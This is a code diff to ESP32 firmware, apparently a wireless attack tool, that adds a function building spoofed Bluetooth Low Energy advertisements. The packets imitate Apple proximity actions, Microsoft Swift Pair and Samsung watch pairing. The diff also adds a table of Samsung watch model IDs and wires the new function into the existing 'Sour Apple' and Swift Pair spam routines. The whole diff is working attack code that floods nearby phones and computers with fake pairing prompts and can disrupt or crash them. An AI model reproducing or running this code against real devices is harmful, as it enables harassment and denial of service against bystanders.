@@ -27,6 +27,99 @@ extern "C" {
   //Exploit by ECTO-1A
   NimBLEAdvertising *pAdvertising;
 
+  //// Spooky
+  NimBLEAdvertisementData WiFiScan::GetUniversalAdvertisementData(EBLEPayloadType Type) {
+    NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();
+
+    uint8_t* AdvData_Raw = nullptr;
+    uint8_t i = 0;
+
+    switch (Type) {
+      case Microsoft: {
+        
+        const char* Name = this->generateRandomName();
+
+        uint8_t name_len = strlen(Name);
+
+        AdvData_Raw = new uint8_t[7 + name_len];
+
+        AdvData_Raw[i++] = 7 + name_len - 1;
+        AdvData_Raw[i++] = 0xFF;
+        AdvData_Raw[i++] = 0x06;
+        AdvData_Raw[i++] = 0x00;
+        AdvData_Raw[i++] = 0x03;
+        AdvData_Raw[i++] = 0x00;
+        AdvData_Raw[i++] = 0x80;
+        memcpy(&AdvData_Raw[i], Name, name_len);
+        i += name_len;
+
+        AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
+        break;
+      }
+      case Apple: {
+        AdvData_Raw = new uint8_t[17];
+
+        AdvData_Raw[i++] = 17 - 1;    // Packet Length
+        AdvData_Raw[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
+        AdvData_Raw[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
+        AdvData_Raw[i++] = 0x00;        // ...
+        AdvData_Raw[i++] = 0x0F;  // Type
+        AdvData_Raw[i++] = 0x05;                        // Length
+        AdvData_Raw[i++] = 0xC1;                        // Action Flags
+        const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
+        AdvData_Raw[i++] = types[rand() % sizeof(types)];  // Action Type
+        esp_fill_random(&AdvData_Raw[i], 3); // Authentication Tag
+        i += 3;   
+        AdvData_Raw[i++] = 0x00;  // ???
+        AdvData_Raw[i++] = 0x00;  // ???
+        AdvData_Raw[i++] =  0x10;  // Type ???
+        esp_fill_random(&AdvData_Raw[i], 3);
+
+        AdvData.addData(std::string((char *)AdvData_Raw, 17));
+        break;
+      }
+      case Samsung: {
+
+        AdvData_Raw = new uint8_t[14];
+
+        uint8_t model = watch_models[rand() % 25].value;
+        
+        AdvData_Raw[i++] = 14; // Size
+        AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+        AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+        AdvData_Raw[i++] = 0x00; // ...
+        AdvData_Raw[i++] = 0x01;
+        AdvData_Raw[i++] = 0x00;
+        AdvData_Raw[i++] = 0x02;
+        AdvData_Raw[i++] = 0x00;
+        AdvData_Raw[i++] = 0x01;
+        AdvData_Raw[i++] = 0x01;
+        AdvData_Raw[i++] = 0xFF;
+        AdvData_Raw[i++] = 0x00;
+        AdvData_Raw[i++] = 0x00;
+        AdvData_Raw[i++] = 0x43;
+        AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
+
+        AdvData.addData(std::string((char *)AdvData_Raw, 14));
+        break;
+      }
+      case Google: {
+        // TODO Google
+        break;
+      }
+      default: {
+        Serial.println("Please Provide a Company Type");
+        break;
+      }
+    }
+
+    delete[] AdvData_Raw;
+
+    return AdvData;
+  }
+  //// Spooky
+
+  // Apple
   NimBLEAdvertisementData getOAdvertisementData() {
     NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
     uint8_t packet[17];
@@ -53,6 +146,7 @@ extern "C" {
     return randomAdvertisementData;
   }
 
+  // Microsoft
   NimBLEAdvertisementData getSwiftAdvertisementData() {
     extern WiFiScan wifi_scan_obj;
     NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
@@ -259,6 +353,35 @@ void WiFiScan::RunSetup() {
   ssids = new LinkedList<ssid>();
   access_points = new LinkedList<AccessPoint>();
   stations = new LinkedList<Station>();
+
+  watch_models = new WatchModel[26] {
+    {0x1A, "Fallback Watch"},
+    {0x01, "White Watch4 Classic 44m"},
+    {0x02, "Black Watch4 Classic 40m"},
+    {0x03, "White Watch4 Classic 40m"},
+    {0x04, "Black Watch4 44mm"},
+    {0x05, "Silver Watch4 44mm"},
+    {0x06, "Green Watch4 44mm"},
+    {0x07, "Black Watch4 40mm"},
+    {0x08, "White Watch4 40mm"},
+    {0x09, "Gold Watch4 40mm"},
+    {0x0A, "French Watch4"},
+    {0x0B, "French Watch4 Classic"},
+    {0x0C, "Fox Watch5 44mm"},
+    {0x11, "Black Watch5 44mm"},
+    {0x12, "Sapphire Watch5 44mm"},
+    {0x13, "Purpleish Watch5 40mm"},
+    {0x14, "Gold Watch5 40mm"},
+    {0x15, "Black Watch5 Pro 45mm"},
+    {0x16, "Gray Watch5 Pro 45mm"},
+    {0x17, "White Watch5 44mm"},
+    {0x18, "White & Black Watch5"},
+    {0x1B, "Black Watch6 Pink 40mm"},
+    {0x1C, "Gold Watch6 Gold 40mm"},
+    {0x1D, "Silver Watch6 Cyan 44mm"},
+    {0x1E, "Black Watch6 Classic 43m"},
+    {0x20, "Green Watch6 Classic 43m"},
+  };
 
   #ifdef HAS_BT
     NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
@@ -1466,7 +1589,8 @@ void WiFiScan::executeSourApple() {
     pAdvertising = pServer->getAdvertising();
 
     delay(40);
-    NimBLEAdvertisementData advertisementData = getOAdvertisementData();
+    //NimBLEAdvertisementData advertisementData = getOAdvertisementData();
+    NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
     pAdvertising->setAdvertisementData(advertisementData);
     pAdvertising->start();
     delay(20);
@@ -1508,7 +1632,8 @@ void WiFiScan::executeSwiftpairSpam() {
 
     pAdvertising = pServer->getAdvertising();
 
-    NimBLEAdvertisementData advertisementData = getSwiftAdvertisementData();
+    //NimBLEAdvertisementData advertisementData = getSwiftAdvertisementData();
+    NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Microsoft);
     pAdvertising->setAdvertisementData(advertisementData);
     pAdvertising->start();
     delay(10);
